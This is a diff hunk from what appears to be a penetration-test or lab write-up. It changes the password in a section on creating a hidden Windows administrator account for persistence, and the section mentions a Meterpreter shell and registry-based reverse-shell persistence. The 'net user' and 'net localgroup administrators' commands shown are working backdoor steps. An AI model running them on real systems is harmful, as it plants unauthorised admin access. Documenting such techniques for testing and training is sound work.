@@ -81,7 +81,7 @@ I established persistence by modifying the Registry. This ensures the reverse sh
 ### 5.3 Backdoor Account Creation (T1136.001 - Local Account)
 To maintain an alternative entry point, I created a hidden administrative account.
 ```bash
-net user Support_Acc Password123 /add
+net user Support_Acc Password1234!! /add
 net localgroup administrators Support_Acc /add
 ```
 ![Backdoor](images/meterpreter_shell_adding_backdoor_user.png)
